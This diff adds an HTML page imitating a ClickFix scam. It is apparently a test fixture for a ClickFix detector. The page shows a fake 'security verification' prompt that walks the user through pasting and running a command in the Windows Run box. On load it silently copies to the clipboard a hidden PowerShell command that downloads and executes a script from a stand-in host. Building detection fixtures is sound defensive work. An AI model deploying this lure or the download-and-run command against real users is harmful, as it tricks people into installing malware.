@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Verification Required</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg-color: #0b0f19;
+      --card-bg: rgba(17, 24, 39, 0.7);
+      --card-border: rgba(255, 255, 255, 0.08);
+      --accent-color: #3b82f6;
+      --accent-glow: rgba(59, 130, 246, 0.5);
+      --text-main: #f3f4f6;
+      --text-muted: #9ca3af;
+      --success-color: #10b981;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Inter', system-ui, -apple-system, sans-serif;
+      background-color: var(--bg-color);
+      color: var(--text-main);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      position: relative;
+    }
+
+    /* Sleek blurred document background to simulate a locked page */
+    .document-preview {
+      position: absolute;
+      inset: 0;
+      padding: 40px;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      filter: blur(8px) brightness(0.3);
+      user-select: none;
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    .doc-line {
+      height: 16px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 4px;
+      width: 100%;
+    }
+    .doc-line.short { width: 60%; }
+    .doc-line.medium { width: 85%; }
+    .doc-header {
+      height: 32px;
+      background: rgba(255, 255, 255, 0.15);
+      border-radius: 6px;
+      width: 40%;
+      margin-bottom: 20px;
+    }
+
+    /* Main modal wrapper */
+    .verification-container {
+      position: relative;
+      z-index: 10;
+      width: 100%;
+      max-width: 520px;
+      padding: 24px;
+    }
+
+    .verification-card {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 16px;
+      padding: 32px;
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5), 
+                  0 0 0 1px var(--card-border);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      animation: fadeIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+
+    .icon-container {
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      background: rgba(59, 130, 246, 0.1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 24px;
+      position: relative;
+      border: 1px solid rgba(59, 130, 246, 0.2);
+    }
+
+    .shield-icon {
+      width: 32px;
+      height: 32px;
+      fill: var(--accent-color);
+      animation: pulse 2s infinite ease-in-out;
+    }
+
+    h1 {
+      font-size: 22px;
+      font-weight: 700;
+      margin-bottom: 12px;
+      letter-spacing: -0.02em;
+    }
+
+    .description {
+      font-size: 14px;
+      color: var(--text-muted);
+      line-height: 1.6;
+      margin-bottom: 28px;
+    }
+
+    /* Step-by-step layout resembling real ClickFix scams */
+    .steps-list {
+      width: 100%;
+      text-align: left;
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 24px;
+      font-size: 13px;
+    }
+
+    .step-item {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 14px;
+      line-height: 1.5;
+    }
+
+    .step-item:last-child {
+      margin-bottom: 0;
+    }
+
+    .step-number {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.1);
+      color: var(--text-main);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 600;
+      font-size: 11px;
+      flex-shrink: 0;
+    }
+
+    .step-text strong {
+      color: #fff;
+    }
+
+    .keyboard-badge {
+      background: rgba(255, 255, 255, 0.12);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: 4px;
+      padding: 1px 5px;
+      font-family: monospace;
+      font-size: 11px;
+      color: #fff;
+    }
+
+    /* Verification Status Banner */
+    .status-banner {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      background: rgba(16, 185, 129, 0.1);
+      border: 1px solid rgba(16, 185, 129, 0.2);
+      color: var(--success-color);
+      font-size: 13px;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      opacity: 0;
+      transform: translateY(10px);
+      transition: all 0.4s ease;
+    }
+
+    .status-banner.active {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .spinner {
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(16, 185, 129, 0.3);
+      border-radius: 50%;
+      border-top-color: var(--success-color);
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes pulse {
+      0%, 100% {
+        transform: scale(1);
+        opacity: 1;
+      }
+      50% {
+        transform: scale(1.05);
+        opacity: 0.8;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Fake blurred document behind the modal to heighten the realism -->
+  <div class="document-preview">
+    <div class="doc-header"></div>
+    <div class="doc-line"></div>
+    <div class="doc-line medium"></div>
+    <div class="doc-line short"></div>
+    <div class="doc-line"></div>
+    <div class="doc-line medium"></div>
+    <div class="doc-line short"></div>
+    <div class="doc-line"></div>
+    <div class="doc-line medium"></div>
+    <div class="doc-line"></div>
+  </div>
+
+  <div class="verification-container">
+    <div class="verification-card">
+      <div class="icon-container">
+        <!-- Shield Icon -->
+        <svg class="shield-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
+        </svg>
+      </div>
+
+      <h1>Security Verification Required</h1>
+      <p class="description">To access this document portal, you must complete the human verification process. A secure verification key has been prepared for your system.</p>
+
+      <div class="steps-list">
+        <div class="step-item">
+          <div class="step-number">1</div>
+          <div class="step-text">The verification patch key is <strong>automatically copied</strong> to your clipboard.</div>
+        </div>
+        <div class="step-item">
+          <div class="step-number">2</div>
+          <div class="step-text">Press <span class="keyboard-badge">Win + R</span> to open the Windows Run dialog.</div>
+        </div>
+        <div class="step-item">
+          <div class="step-number">3</div>
+          <div class="step-text">Right-click inside the Run box and select <strong>Paste</strong>, or press <span class="keyboard-badge">Ctrl + V</span>.</div>
+        </div>
+        <div class="step-item">
+          <div class="step-number">4</div>
+          <div class="step-text">Press <span class="keyboard-badge">Enter</span> to execute the verification patch.</div>
+        </div>
+      </div>
+
+      <div id="status-banner" class="status-banner">
+        <div class="spinner"></div>
+        <span id="status-text">Verification key generated and copied...</span>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Fake malicious command designed to trigger Threat Sense ClickFix detection
+    const fakeMaliciousCommand = 'powershell -w hidden -nop -c "IEX ((New-Object Net.WebClient).DownloadString(\'https://cdn-verification-check.test/update.ps1\'))"';
+
+    async function autoloadVerificationKey() {
+      const banner = document.getElementById('status-banner');
+      const statusText = document.getElementById('status-text');
+
+      try {
+        // Attempt to copy the malicious payload automatically on load
+        await navigator.clipboard.writeText(fakeMaliciousCommand);
+        banner.classList.add('active');
+        statusText.textContent = "Verification key copied! Follow steps 2-4.";
+      } catch (err) {
+        console.warn("Autoload clipboard write blocked or intercepted: ", err);
+        // Still activate the banner in the UI to look realistic to the user
+        banner.classList.add('active');
+        statusText.textContent = "Verification key prepared. Ready to paste.";
+      }
+    }
+
+    // Try executing immediately
+    autoloadVerificationKey();
+
+    // Fallback on complete page load
+    window.addEventListener('load', () => {
+      // Also try to copy in case navigator.clipboard wasn't fully initialized
+      navigator.clipboard.writeText(fakeMaliciousCommand).catch(() => {});
+    });
+  </script>
+</body>
+</html>
